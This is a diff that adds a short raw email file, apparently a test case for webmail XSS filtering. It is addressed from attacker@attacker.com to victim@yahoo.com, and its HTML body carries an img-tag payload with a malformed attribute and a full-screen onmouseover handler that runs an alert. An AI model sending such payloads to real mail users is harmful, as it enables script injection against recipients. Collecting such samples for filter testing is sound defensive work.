@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: hello
+To: victim@yahoo.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<img ismap=itemtype=yyy style=width:100%;height:100%;position:fixed;left:0px;top:0px; onmouseover=alert(/XSS/)//>
